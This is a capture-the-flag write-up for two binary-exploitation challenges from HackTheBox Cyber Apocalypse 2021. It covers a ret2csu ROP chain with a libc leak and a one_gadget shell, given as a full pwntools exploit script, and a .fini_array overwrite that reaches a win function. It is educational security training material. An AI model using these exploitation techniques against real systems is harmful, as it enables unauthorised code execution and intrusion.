# HackTheBox Cyber Apocalypse CTF 2021

## Pwn: System dROP

```
Disclaimer: The flag in this challenge suggested using SROP to exploit the challenge, but I couldn't figure out for the life of me how to make it possible. Hence, I did this via the traditional way.
```

We're presented with the binary `system_drop`, containing only the `main` function which reads in 256 bytes into a buffer and then quits. Based on radare2's disassembly output, we can quickly figure out that 40 bytes is needed before we begin to overwrite the return pointer. The name of the binary suggests that we might need to drop a `system()` shell via Return-Oriented Programming (ROP).

```
[0x00400450]> pdf @ main
            ; DATA XREF from entry0 @ 0x40046d
/ 47: int main (int argc, char **argv, char **envp);
|           ; var void *buf @ rbp-0x20
|           0x00400541      55             push rbp
|           0x00400542      4889e5         mov rbp, rsp
|           0x00400545      4883ec20       sub rsp, 0x20
|           0x00400549      bf0f000000     mov edi, 0xf                ; 15
|           0x0040054e      e8ddfeffff     call sym.imp.alarm
|           0x00400553      488d45e0       lea rax, [buf]
|           0x00400557      ba00010000     mov edx, 0x100              ; 256 ; size_t nbyte
|           0x0040055c      4889c6         mov rsi, rax                ; void *buf
|           0x0040055f      bf00000000     mov edi, 0                  ; int fildes
|           0x00400564      e8d7feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x00400569      b801000000     mov eax, 1
|           0x0040056e      c9             leave
\           0x0040056f      c3             ret
```

Given the lackluster main function, we don't have much to go on from here. Initially, I had thought of performing a `Sigreturn-oriented programming` (sigrop) attack based off my experience with a similar echo binary CTF challenge, however without a way to easily control the `rax` register, it's a tall order. In the end, I decided to go with a `ret2csu` attack. To do this, we need to take note of a couple of addresses in the `__libc_csu_init` function, namely the address of `gadget1`, `gadget2`, and pointer to `_init` function as suggested in this [writeup](https://www.rootnetsec.com/ropemporium-ret2csu/).

This results in the following behaviour:

- Set `rax` to 0x00
- Set `edi`, `rsi`, `rdx`, `rbx`, and `rbp` to a value we control

```
[0x00400450]> pdf @ sym.__libc_csu_init
            ; DATA XREF from entry0 @ 0x400466
/ 101: sym.__libc_csu_init (int64_t arg1, int64_t arg2, int64_t arg3);
|           ; arg int64_t arg1 @ rdi
|           ; arg int64_t arg2 @ rsi
|           ; arg int64_t arg3 @ rdx
|           0x00400570      4157           push r15
|           0x00400572      4156           push r14
|           0x00400574      4989d7         mov r15, rdx                ; arg3
|           0x00400577      4155           push r13
|           0x00400579      4154           push r12
|           0x0040057b      4c8d258e0820.  lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start
|                                                                      ; 0x600e10 ; "0\x05@"
|           0x00400582      55             push rbp
|           0x00400583      488d2d8e0820.  lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end
|                                                                      ; 0x600e18
|           0x0040058a      53             push rbx
|           0x0040058b      4189fd         mov r13d, edi               ; arg1
|           0x0040058e      4989f6         mov r14, rsi                ; arg2
|           0x00400591      4c29e5         sub rbp, r12
|           0x00400594      4883ec08       sub rsp, 8
|           0x00400598      48c1fd03       sar rbp, 3
|           0x0040059c      e85ffeffff     call sym._init
|           0x004005a1      4885ed         test rbp, rbp
|       ,=< 0x004005a4      7420           je 0x4005c6
|       |   0x004005a6      31db           xor ebx, ebx
|       |   0x004005a8      0f1f84000000.  nop dword [rax + rax]
|       |   ; CODE XREF from sym.__libc_csu_init @ 0x4005c4
|      .--> 0x004005b0      4c89fa         mov rdx, r15
|      :|   0x004005b3      4c89f6         mov rsi, r14
|      :|   0x004005b6      4489ef         mov edi, r13d
|      :|   0x004005b9      41ff14dc       call qword [r12 + rbx*8]
|      :|   0x004005bd      4883c301       add rbx, 1
|      :|   0x004005c1      4839dd         cmp rbp, rbx
|      `==< 0x004005c4      75ea           jne 0x4005b0
|       |   ; CODE XREF from sym.__libc_csu_init @ 0x4005a4
|       `-> 0x004005c6      4883c408       add rsp, 8
|           0x004005ca      5b             pop rbx
|           0x004005cb      5d             pop rbp
|           0x004005cc      415c           pop r12
|           0x004005ce      415d           pop r13
|           0x004005d0      415e           pop r14
|           0x004005d2      415f           pop r15
\           0x004005d4      c3             ret
[0x00400450]> /v 0x400400
Searching 4 bytes in [0x601038-0x601040]
hits: 0
Searching 4 bytes in [0x600e10-0x601038]
hits: 1
Searching 4 bytes in [0x400000-0x400758]
hits: 0
0x00600e38 hit0_0 00044000
```

Based on the above output, we have our required addresses to make the attack work.

- gadget1: `0x004005ca`
- gadget2: `0x004005b0`
- init_pointer: `0x00400e38`

Payload 1 is as follows:

```python
elf.sym.payload = 0x601100

payload = p64(gadget1)
payload += p64(0x00)                                # pop rbx
payload += p64(0x01)                                # pop rbp
payload += p64(init_pointer)                        # pop r12
payload += p64(0x00)                                # pop r13 (edi)
payload += p64(elf.sym.payload)                     # pop r14 (rsi)
payload += p64(len(payload2))                       # pop r15 (rdx)
payload += p64(gadget2)
payload += p64(0x00)                                # add rsp,0x8 padding
payload += p64(0x00)                                # rbx
payload += p64(elf.sym.payload - context.bytes)     # rbp
payload += p64(0x00)                                # r12
payload += p64(0x00)                                # r13
payload += p64(0x00)                                # r14
payload += p64(0x00)                                # r15
payload += p64(rop.syscall[0])
payload += p64(mov_eax_1)
```

`mov_eax_1` (0x400569) is simply a `mov eax, 1; leave; ret` gadget found at the end of the main function. After the 2nd payload is written, this gadget will set `eax` to 1 (SYS_write) before migrating the stack to `0x601100`.

Payload 2 is as follows:

```python
elf.sym.payload = 0x601100

payload2 = flat(rop.rdi[0],     0x1,
                rop.rsi[0],     elf.got.alarm, 0x0,
                rop.syscall[0],
                rop.rbp[0],     elf.sym.payload + 0x200,
                elf.sym.main)
```

This will leak the `alarm@plt` address in the GOT, allowing to derive the correct libc version to calculate offsets. By also leaking the `read@plt` GOT address and confirming the offsets on an online [libc-database](https://libc.blukat.me/), we infer that the libc version used is `2.27` running on `Ubuntu 18.04`. With that out of the way, we can obtain a local copy of the libc shared object to replicate the memory state of the remote process after ASLR, as relative offsets still remain constant from one another. This payloads ends off by jumping us back to the start of the main function where we can perform another round of buffer overflow.

Although it is possible to call `system('/bin/sh')` or manually perform a `SYS_execve` call to `/bin/sh`, there's an even easier option with `one_gadget` to give us an address that when executed will magically give us a shell as long as we meet certain constraints. Truly the ONE gadget to rule them all!

```sh
$ one_gadget libc6_2.27-3ubuntu1.4_amd64.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Seems like there are 3 gadgets to choose from. I went with the middle gadget. Running my exploit script for the last time, I managed to drop a shell into the system (no pun intended). Interestingly, the flag suggested `sigrop` to be the intended method, so my initial thought process wasn't wrong.

Flag: `CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}`

### Exploit Script

```python
#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./system_drop')
rop = ROP(elf)

if args.REMOTE:
    io = remote('127.0.0.1', 8080)
    libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')
else:
    io = elf.process()
    libc = io.libc

elf.sym.payload = 0x601100
eip_offset = 40

gadget1 = 0x004005ca
gadget2 = 0x004005b0
init_pointer = 0x00400e38
mov_eax_1 = 0x00400569

# Prepare 2nd payload
payload2 = flat(rop.rdi[0],     0x1,
                rop.rsi[0],     elf.got.alarm, 0x0,
                rop.syscall[0],
                rop.rbp[0],     elf.sym.payload + 0x200,
                elf.sym.main)

# Prepare 1st payload
payload = p64(gadget1)
payload += p64(0x00)                                # pop rbx
payload += p64(0x01)                                # pop rbp
payload += p64(init_pointer)                        # pop r12
payload += p64(0x00)                                # pop r13 (edi)
payload += p64(elf.sym.payload)                     # pop r14 (rsi)
payload += p64(len(payload2))                       # pop r15 (rdx)
payload += p64(gadget2)
payload += p64(0x00)                                # add rsp,0x8 padding
payload += p64(0x00)                                # rbx
payload += p64(elf.sym.payload - context.bytes)     # rbp
payload += p64(0x00)                                # r12
payload += p64(0x00)                                # r13
payload += p64(0x00)                                # r14
payload += p64(0x00)                                # r15
payload += p64(rop.syscall[0])
payload += p64(mov_eax_1)

# Send both payloads
io.send(flat({eip_offset: payload, 0x100: b''}))
io.send(payload2)

alarm = u64(io.recvn(context.bytes))
libc.address = args.REMOTE and alarm - libc.sym.alarm or libc.address
system = libc.sym.system
one_gadget = libc.address + 0x4f432
log.success(f"alarm @ {hex(alarm)}")
log.success(f"libc base @ {hex(libc.address)}")
log.success(f"one_gadget @ {hex(one_gadget)}")

# Receive GOT leak and trigger shell
io.recv(len(payload2) - context.bytes)
io.send(flat({eip_offset: one_gadget}))
io.interactive()
```

## Pwn: Minefield

We're given a binary that asks us if we are ready to plant the mine. Here's what happens if we are not ready:

```sh
$ ./minefield
Are you ready to plant the mine?
1. No.
2. Yes, I am ready.
> 1
If you are not ready we cannot continue.
```

A rather lackluster response. Let us take a deeper dive into the disassembly. It seems like the main function calls `menu()` which then passes our input to `choice()` which contains the meat of the program logic.

```
[0x004007b0]> pdf @ sym.choice
            ; CALL XREF from sym.menu @ 0x400bd2
/ 121: sym.choice (uint32_t arg1);
|           ; var int64_t var_24h @ rbp-0x24
|           ; var int64_t var_18h @ rbp-0x18
|           ; var int64_t var_10h @ rbp-0x10
|           ; var int64_t var_8h @ rbp-0x8
|           ; arg uint32_t arg1 @ rdi
|           0x00400af7      55             push rbp
|           0x00400af8      4889e5         mov rbp, rsp
|           0x00400afb      4883ec30       sub rsp, 0x30
|           0x00400aff      897ddc         mov dword [var_24h], edi    ; arg1
|           0x00400b02      64488b042528.  mov rax, qword fs:[0x28]
|           0x00400b0b      488945f8       mov qword [var_8h], rax
|           0x00400b0f      31c0           xor eax, eax
|           0x00400b11      837ddc01       cmp dword [var_24h], 1
|       ,=< 0x00400b15      7521           jne 0x400b38
|       |   0x00400b17      488d05420200.  lea rax, str.If_you_are_not_ready_we_cannot_continue. ; 0x400d60 ; "If you are not ready we cannot continue.\n"
|       |   0x00400b1e      488945f0       mov qword [var_10h], rax
|       |   0x00400b22      488b45f0       mov rax, qword [var_10h]
|       |   0x00400b26      4889c7         mov rdi, rax                ; char *arg1
|       |   0x00400b29      e8a3fdffff     call sym.w
|       |   0x00400b2e      bf22000000     mov edi, 0x22               ; '"' ; 34 ; int status
|       |   0x00400b33      e868fcffff     call sym.imp.exit           ; void exit(int status)
|       |   ; CODE XREF from sym.choice @ 0x400b15
|       `-> 0x00400b38      488d05510200.  lea rax, str.We_are_ready_to_proceed_then ; 0x400d90 ; "We are ready to proceed then!\n"
|           0x00400b3f      488945e8       mov qword [var_18h], rax
|           0x00400b43      488b45e8       mov rax, qword [var_18h]
|           0x00400b47      4889c7         mov rdi, rax                ; char *arg1
|           0x00400b4a      e882fdffff     call sym.w
|           0x00400b4f      b800000000     mov eax, 0
|           0x00400b54      e8ebfeffff     call sym.mission
|           0x00400b59      90             nop
|           0x00400b5a      488b45f8       mov rax, qword [var_8h]
|           0x00400b5e      644833042528.  xor rax, qword fs:[0x28]
|       ,=< 0x00400b67      7405           je 0x400b6e
|       |   0x00400b69      e8b2fbffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |   ; CODE XREF from sym.choice @ 0x400b67
|       `-> 0x00400b6e      c9             leave
\           0x00400b6f      c3             ret
```

Choosing option 2 will invoke the `mission()` function. 

```
[0x004007b0]> pdf @ sym.mission
            ; CALL XREF from sym.choice @ 0x400b54
/ 179: sym.mission ();
|           ; var int64_t var_30h @ rbp-0x30
|           ; var int64_t var_28h @ rbp-0x28
|           ; var int64_t var_1ch @ rbp-0x1c
|           ; var int64_t var_12h @ rbp-0x12
|           ; var int64_t var_8h @ rbp-0x8
|           0x00400a44      55             push rbp
|           0x00400a45      4889e5         mov rbp, rsp
|           0x00400a48      4883ec30       sub rsp, 0x30
|           0x00400a4c      64488b042528.  mov rax, qword fs:[0x28]
|           0x00400a55      488945f8       mov qword [var_8h], rax
|           0x00400a59      31c0           xor eax, eax
|           0x00400a5b      488d3d900200.  lea rdi, str.Insert_type_of_mine: ; 0x400cf2 ; "Insert type of mine: " ; const char *format
|           0x00400a62      b800000000     mov eax, 0
|           0x00400a67      e8d4fcffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400a6c      488d45e4       lea rax, [var_1ch]
|           0x00400a70      4889c7         mov rdi, rax
|           0x00400a73      e8abfeffff     call sym.r
|           0x00400a78      488d45e4       lea rax, [var_1ch]
|           0x00400a7c      ba00000000     mov edx, 0                  ; int base
|           0x00400a81      be00000000     mov esi, 0                  ; char * *endptr
|           0x00400a86      4889c7         mov rdi, rax                ; const char *str
|           0x00400a89      e8e2fcffff     call sym.imp.strtoull       ; long long strtoull(const char *str, char * *endptr, int base)
|           0x00400a8e      488945d0       mov qword [var_30h], rax
|           0x00400a92      488d3d6f0200.  lea rdi, str.Insert_location_to_plant: ; 0x400d08 ; "Insert location to plant: " ; const char *format
|           0x00400a99      b800000000     mov eax, 0
|           0x00400a9e      e89dfcffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400aa3      488d45ee       lea rax, [var_12h]
|           0x00400aa7      4889c7         mov rdi, rax
|           0x00400aaa      e874feffff     call sym.r
|           0x00400aaf      488d3d720200.  lea rdi, str.We_need_to_get_out_of_here_as_soon_as_possible._Run ; 0x400d28 ; "We need to get out of here as soon as possible. Run!" ; const char *s
|           0x00400ab6      e835fcffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400abb      488d45ee       lea rax, [var_12h]
|           0x00400abf      ba00000000     mov edx, 0                  ; int base
|           0x00400ac4      be00000000     mov esi, 0                  ; char * *endptr
|           0x00400ac9      4889c7         mov rdi, rax                ; const char *str
|           0x00400acc      e89ffcffff     call sym.imp.strtoull       ; long long strtoull(const char *str, char * *endptr, int base)
|           0x00400ad1      488945d8       mov qword [var_28h], rax
|           0x00400ad5      488b55d8       mov rdx, qword [var_28h]
|           0x00400ad9      488b45d0       mov rax, qword [var_30h]
|           0x00400add      488910         mov qword [rax], rdx
|           0x00400ae0      90             nop
|           0x00400ae1      488b45f8       mov rax, qword [var_8h]
|           0x00400ae5      644833042528.  xor rax, qword fs:[0x28]
|       ,=< 0x00400aee      7405           je 0x400af5
|       |   0x00400af0      e82bfcffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |   ; CODE XREF from sym.mission @ 0x400aee
|       `-> 0x00400af5      c9             leave
\           0x00400af6      c3             ret
```

From the disassembly, it looks like the response to `Insert type of mine: ` will be the address to write to, and the response to `Insert location to plant: ` will be the actual value that we write. Afterwards the program eventually exits. Knowing this, let us find a way to hijack the execution flow before that and spawn our shell.

```
[0x004007b0]> iS
[Sections]

nth paddr        size vaddr       vsize perm name
-------------------------------------------------
0   0x00000000    0x0 0x00000000    0x0 ----
1   0x00000200   0x1c 0x00400200   0x1c -r-- .interp
2   0x0000021c   0x20 0x0040021c   0x20 -r-- .note.ABI_tag
3   0x0000023c   0x24 0x0040023c   0x24 -r-- .note.gnu.build_id
4   0x00000260   0x28 0x00400260   0x28 -r-- .gnu.hash
5   0x00000288  0x198 0x00400288  0x198 -r-- .dynsym
6   0x00000420   0xba 0x00400420   0xba -r-- .dynstr
7   0x000004da   0x22 0x004004da   0x22 -r-- .gnu.version
8   0x00000500   0x40 0x00400500   0x40 -r-- .gnu.version_r
9   0x00000540   0x60 0x00400540   0x60 -r-- .rela.dyn
10  0x000005a0  0x120 0x004005a0  0x120 -r-- .rela.plt
11  0x000006c0   0x17 0x004006c0   0x17 -r-x .init
12  0x000006e0   0xd0 0x004006e0   0xd0 -r-x .plt
13  0x000007b0  0x4f2 0x004007b0  0x4f2 -r-x .text
14  0x00000ca4    0x9 0x00400ca4    0x9 -r-x .fini
15  0x00000cb0  0x142 0x00400cb0  0x142 -r-- .rodata
16  0x00000df4   0x7c 0x00400df4   0x7c -r-- .eh_frame_hdr
17  0x00000e70  0x200 0x00400e70  0x200 -r-- .eh_frame
18  0x00001070    0x8 0x00601070    0x8 -rw- .init_array
19  0x00001078    0x8 0x00601078    0x8 -rw- .fini_array
20  0x00001080  0x1d0 0x00601080  0x1d0 -rw- .dynamic
21  0x00001250   0x10 0x00601250   0x10 -rw- .got
22  0x00001260   0x78 0x00601260   0x78 -rw- .got.plt
23  0x000012d8   0x10 0x006012d8   0x10 -rw- .data
24  0x000012e8    0x0 0x006012f0   0x20 -rw- .bss
25  0x000012e8   0x29 0x00000000   0x29 ---- .comment
26  0x00001318  0x7b0 0x00000000  0x7b0 ---- .symtab
27  0x00001ac8  0x301 0x00000000  0x301 ---- .strtab
28  0x00001dc9  0x103 0x00000000  0x103 ---- .shstrtab
```

There is one interesting place that we can write to that the program will attempt to execute if it isn't null, and that's the `.fini_array`. Looking at the virtual addresses of the section table above, we can determine `.fini_array` to be `0x00601078`. We need to overwrite it with the value of the `win` function at `0x0040096b`.

```sh
$ ./minefield
Are you ready to plant the mine?
1. No.
2. Yes, I am ready.
> 2
We are ready to proceed then!
Insert type of mine: 6295672
Insert location to plant: 4196715
We need to get out of here as soon as possible. Run!

Mission accomplished! ✔
CHTB{d3struct0r5_m1n3f13ld}
```

## Pwn: Harvester

TBD